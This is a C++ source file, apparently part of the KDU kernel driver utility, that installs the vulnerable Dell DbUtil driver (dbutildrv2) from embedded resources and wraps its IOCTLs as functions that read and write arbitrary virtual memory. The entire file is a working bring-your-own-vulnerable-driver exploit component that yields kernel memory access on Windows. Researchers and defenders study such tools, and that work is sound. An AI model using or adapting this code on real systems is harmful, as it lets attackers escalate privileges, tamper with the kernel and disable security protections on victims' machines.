/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       DBUTIL.CPP
*
*  VERSION:     1.20
*
*  DATE:        08 Feb 2022
*
*  Dell BIOS Utility driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/dbutil.h"

WCHAR g_DbUtilHardwareId[] = { L'R', L'O', L'O', L'T', L'\\', L'D', L'B', L'U', L't', L'i', L'l', L'D', L'r', L'v', L'2', 0, 0, 0, 0 };
HDEVINFO g_DbUtilDevInfo = NULL;
SP_DEVINFO_DATA g_DbUtilDevInfoData;

#define DBUTILCAT_FILE TEXT("dbutildrv2.cat")
#define DBUTILINF_FILE TEXT("dbutildrv2.inf")

/*
* DbUtilManageFiles
*
* Purpose:
*
* Drop or remove required files from disk in the current process directory.
*
*/
BOOL DbUtilManageFiles(
    _In_ KDU_CONTEXT* Context,
    _In_ BOOLEAN DoInstall
)
{
    BOOL bResult = FALSE;
    DWORD cch;
    LPWSTR lpEnd;
    WCHAR szFileName[MAX_PATH * 2];

    if (DoInstall) {

        //
        // Drop DbUtilDrv2.
        //
        if (!KDUProvExtractVulnerableDriver(Context))
            return FALSE;

        //
        // Drop cat and inf files.
        //
        RtlSecureZeroMemory(&szFileName, sizeof(szFileName));
        cch = supExpandEnvironmentStrings(L"%temp%\\", szFileName, MAX_PATH);
        if (cch == 0 || cch > MAX_PATH) {
            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        }
        else {
            lpEnd = _strend(szFileName);

            _strcat(szFileName, DBUTILCAT_FILE);
            if (supExtractFileFromDB(Context->ModuleBase, szFileName, IDR_DATA_DBUTILCAT)) {
                *lpEnd = 0;
                _strcat(szFileName, DBUTILINF_FILE);
                if (supExtractFileFromDB(Context->ModuleBase, szFileName, IDR_DATA_DBUTILINF)) {

                    g_DbUtilDevInfo = NULL;

                    bResult = supSetupInstallDriverFromInf(szFileName,
                        (PBYTE)&g_DbUtilHardwareId,
                        sizeof(g_DbUtilHardwareId),
                        &g_DbUtilDevInfo,
                        &g_DbUtilDevInfoData);

                }
            }
        }

    }
    else {

        //
        // Remove cat/inf files.
        //
        RtlSecureZeroMemory(&szFileName, sizeof(szFileName));
        cch = supExpandEnvironmentStrings(L"%temp%\\", szFileName, MAX_PATH);
        if (cch == 0 || cch > MAX_PATH) {
            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        }
        else {

            lpEnd = _strend(szFileName);

            _strcat(szFileName, DBUTILCAT_FILE);
            DeleteFile(szFileName);

            *lpEnd = 0;

            _strcat(szFileName, DBUTILINF_FILE);
            DeleteFile(szFileName);


            bResult = TRUE;
        }

    }
    return bResult;
}

/*
* DbUtilStartVulnerableDriver
*
* Purpose:
*
* Start vulnerable driver callback.
* Install DbUtil device.
*/
BOOL DbUtilStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    LPWSTR   lpDeviceName = Context->Provider->DeviceName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        RtlSecureZeroMemory(&g_DbUtilDevInfoData, sizeof(g_DbUtilDevInfoData));
        bLoaded = DbUtilManageFiles(Context, TRUE);

    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
        KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }

    return (Context->DeviceHandle != NULL);
}

/*
* DbUtilStopVulnerableDriver
*
* Purpose:
*
* Stop vulnerable driver callback.
* Uninstall DbUtil device and remove files.
*
*/
VOID DbUtilStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    LPWSTR lpFullFileName = Context->DriverFileName;

    supSetupRemoveDriver(g_DbUtilDevInfo, &g_DbUtilDevInfoData);
    DbUtilManageFiles(Context, FALSE);

    if (supDeleteFileWithWait(1000, 5, lpFullFileName))
        printf_s("[+] Vulnerable driver file removed\r\n");
}

/*
* DbUtilReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via Dell DbUtil driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI DbUtilReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    ULONG value;
    DWORD dwError = ERROR_SUCCESS;
    DBUTIL_READWRITE_REQUEST* pRequest;

    value = FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (DBUTIL_READWRITE_REQUEST*)VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->Unused = 0xDEADBEEF;
            pRequest->VirtualAddress = VirtualAddress;
            pRequest->Offset = 0;

            bResult = supCallDriver(DeviceHandle,
                IOCTL_DBUTIL_READVM,
                pRequest,
                (ULONG)size,
                pRequest,
                (ULONG)size);

            if (!bResult) {
                dwError = GetLastError();
            }
            else {
                RtlCopyMemory(Buffer, pRequest->Data, NumberOfBytes);
            }

            VirtualUnlock(pRequest, size);
        }

        VirtualFree(pRequest, 0, MEM_RELEASE);
    }

    SetLastError(dwError);
    return bResult;

}

/*
* DbUtilWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via Dell DbUtil driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI DbUtilWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    ULONG value;
    DWORD dwError = ERROR_SUCCESS;

    DBUTIL_READWRITE_REQUEST* pRequest;

    value = FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (DBUTIL_READWRITE_REQUEST*)VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->Unused = 0xDEADBEEF;
            pRequest->VirtualAddress = VirtualAddress;
            pRequest->Offset = 0;
            RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

            bResult = supCallDriver(DeviceHandle,
                IOCTL_DBUTIL_WRITEVM,
                pRequest,
                (ULONG)size,
                pRequest,
                (ULONG)size);

            if (!bResult)
                dwError = GetLastError();

            VirtualUnlock(pRequest, size);
        }

        VirtualFree(pRequest, 0, MEM_RELEASE);
    }

    SetLastError(dwError);
    return bResult;
}
